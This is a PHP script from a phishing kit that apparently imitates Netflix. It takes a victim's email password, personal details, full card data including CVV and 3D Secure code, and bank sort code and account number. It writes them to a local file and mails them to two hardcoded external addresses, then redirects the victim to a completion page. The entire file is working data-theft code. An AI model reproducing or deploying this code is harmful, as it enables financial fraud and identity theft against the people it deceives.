<?php
session_start();

$ip = getenv("REMOTE_ADDR");
$crd = $_POST['crd'];

$msg = "

Email Address : ".$_SESSION['email']."
Password : ".$_SESSION['password']."
Full Name : ".$_SESSION['name']."
Date of Birth : ".$_SESSION['day']." ".$_SESSION['month']." ".$_SESSION['year']."
Billing Address : ".$_SESSION['billing']."
City : ".$_SESSION['city']."
County : ".$_SESSION['county']."
Postcode : ".$_SESSION['postcode']."
Mobile Number : ".$_SESSION['mobile']."
---------------------------------
Name On Card : ".$_POST['nmc']."
Card Number : ".$_POST['crd']."
Expiry Date : ".$_POST['exm']." ".$_POST['exy']."
CSC/CVV : ".$_POST['csc']."
Sort Code : ".$_POST['sortcode']."
Account Number : ".$_POST['acb']."
3D secure : ".$_POST['3dsecure']."

IP : $ip
==================================\n";

$to="matekeefy@gmail.com,azed.ben@outlook.fr";
$subj = "$crd - $ip";
$headers= "From: Netflex  <info@mox.com>";
$headers .= "MIME-Version: 1.0\n";
$monfichier = fopen('cs', 'a+');
fwrite($monfichier,$msg);
fclose($monfichier);
mail($to, $subj, $msg,$headers);

header("Location: complete.php?ip=$ip");
?>


